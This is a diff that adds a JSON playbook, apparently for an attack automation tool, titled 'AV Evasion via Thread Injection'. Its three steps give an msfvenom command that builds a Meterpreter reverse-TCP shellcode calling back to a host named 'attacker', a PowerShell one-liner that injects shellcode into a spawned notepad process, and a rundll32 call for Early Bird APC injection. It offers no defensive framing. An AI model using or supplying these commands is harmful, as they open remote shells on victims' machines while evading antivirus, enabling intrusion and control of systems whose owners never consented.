@@ -1,0 +1,25 @@
+{
+	"name": "AV Evasion via Thread Injection",
+	"description": "Inject shellcode into remote process to bypass AV.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Generate Shellcode",
+			"command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=443 -f raw > shell.bin",
+			"description": "Create position-independent code."
+		},
+		{
+			"index": 2,
+			"name": "PowerShell Injection",
+			"command": "$proc = Start-Process notepad -PassThru; $handle = (Get-Process -Id $proc.Id).Handle; [MyInject]::Inject($handle, $shellcode)",
+			"description": "Custom injector to notepad.exe."
+		},
+		{
+			"index": 3,
+			"name": "Early Bird APC",
+			"command": "rundll32.exe injection.dll,Inject",
+			"description": "Queue APC in suspended process."
+		}
+	]
+}
